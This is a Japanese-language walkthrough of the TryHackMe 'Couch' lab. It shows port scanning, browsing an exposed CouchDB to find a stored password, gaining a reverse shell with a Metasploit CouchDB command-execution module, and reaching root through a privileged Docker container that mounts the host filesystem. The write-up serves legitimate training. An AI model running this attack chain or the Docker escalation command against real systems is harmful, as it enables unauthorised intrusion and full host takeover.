# Couch CTF

https://tryhackme.com/room/couch

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.177.200
root@ip-10-10-167-103:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 07:49 GMT
Nmap scan report for 10.10.177.200
Host is up (0.0069s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5984/tcp open  couchdb
MAC Address: 02:C5:CD:D7:A3:FB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.86 seconds
root@ip-10-10-167-103:~# sudo nmap -sV -p22,5984 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 07:49 GMT
Nmap scan report for 10.10.177.200
Host is up (0.00014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
MAC Address: 02:C5:CD:D7:A3:FB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

SSH, CouchDB

## CouchDB

### /_all_dbs

CouchDBのガイドから、/_all_dbs のパスを発見。

https://guide.couchdb.org/draft/tour.html

/_all_dbs

```json
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```

/_replicator
```json
{"db_name":"_replicator","doc_count":1,"doc_del_count":0,"update_seq":1,"purge_seq":0,"compact_running":false,"disk_size":4194,"data_size":2006,"instance_start_time":"1742456849866598","disk_format_version":6,"committed_update_seq":1}
```

/_users

```json
{"db_name":"_users","doc_count":1,"doc_del_count":0,"update_seq":1,"purge_seq":0,"compact_running":false,"disk_size":4194,"data_size":2141,"instance_start_time":"1742456850388038","disk_format_version":6,"committed_update_seq":1}
```

/couch

```json
{"db_name":"couch","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":316,"instance_start_time":"1742458414236715","disk_format_version":6,"committed_update_seq":2}
```

/secret

```json
{"db_name":"secret","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":339,"instance_start_time":"1742458441885156","disk_format_version":6,"committed_update_seq":2}
```

/test_suite_db

```json
{"db_name":"test_suite_db","doc_count":3,"doc_del_count":1,"update_seq":6,"purge_seq":0,"compact_running":false,"disk_size":8297,"data_size":1097,"instance_start_time":"1742458468524093","disk_format_version":6,"committed_update_seq":6}
```

/test_suite_db2

```json
{"db_name":"test_suite_db2","doc_count":3,"doc_del_count":1,"update_seq":4,"purge_seq":0,"compact_running":false,"disk_size":8297,"data_size":1055,"instance_start_time":"1742458504970452","disk_format_version":6,"committed_update_seq":4}
```

### /_utils

同じガイドで _utils ページのパスを知った。管理Web画面が表示される。

secretの中を見ると下記の内容だった。

```json
{
   "_id": "a1320dd69fb4570d0a3d26df4e000be7",
   "_rev": "2-57b28bd986d343cacd9cb3fca0b20c46",
   "passwordbackup": "atena:ひみつ"
}
```

## Metasploit

```shell
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOSTS 10.10.177.200
RHOSTS => 10.10.177.200
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set HttpUsername atena
HttpUsername => atena
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set HttpPassword ひみつ
HttpPassword => ひみつ
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 8008
LPORT => 8080
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > exploit

id
uid=110(couchdb) gid=117(couchdb) groups=117(couchdb)
```

シェルをとれた。

```shell
ls -al /home/atena
total 48
drwxr-xr-x 6 atena atena 4096 Dec 18  2020 .
drwxr-xr-x 3 root  root  4096 Oct 24  2020 ..
-rw------- 1 atena atena 3171 Dec 18  2020 .bash_history
-rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
-rw-r--r-- 1 atena atena 3771 Oct 24  2020 .bashrc
drwxr-xr-x 3 root  root  4096 Oct 24  2020 .bundle
drwx------ 2 atena atena 4096 Oct 24  2020 .cache
drwx------ 2 root  root  4096 Oct 24  2020 .gnupg
drwxrwxr-x 2 atena atena 4096 Dec 18  2020 .nano
-rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
-rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts
-rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
cat /home/atena/user.txt
THM{..................}
```

ユーザーフラグゲット。

## 権限昇格１

secretテーブルから取得したデータで、atena にユーザー変更できた。

```shell
couchdb@ubuntu:/var/lib/couchdb$ su atena
su atena
Password: 

atena@ubuntu:/var/lib/couchdb$ id
id
uid=1000(atena) gid=1000(atena) groups=1000(atena),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
atena@ubuntu:/var/lib/couchdb$ 
```

## 権限昇格２

sudo はついていない。  
SUID, SGID も特になし。

.bash_history を見ると、既に侵害を受けているような形跡が見られた。

```
rm -r flag/
apt-get remove redis
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
uname -a
exit
id
sudo -l
find / -perm -u=s -type f -ls 2>/dev/null
```

同じdocker コマンドを実行したらrootシェルをとれた。

```shell
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

docker の /mnt ディレクトリに、ホストOSの / がマウントされている。

```shell
/ # ls -al /mnt/root
total 24
drwx------    3 root     root          4096 Dec 18  2020 .
drwxr-xr-x   22 root     root          4096 Oct 25  2020 ..
-rw-r--r--    1 root     root          3106 Oct 22  2015 .bashrc
drwxr-xr-x    2 root     root          4096 Oct 25  2020 .nano
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root            26 Dec 18  2020 root.txt
/ # cat /mnt/root/root.txt
THM{............}
```

ルートフラグゲット。

## 振り返り

- Metasploit使わずとも、パスワードを使って直で atena で SSH接続することができたので余計な手順だった。
- Metasploitはユーザー名とパスワード設定しなくても成功するが、パスワードを知らなければ atena への昇格ができなかった。
- alpine は lxd 権限昇格でも使うコンテナ。
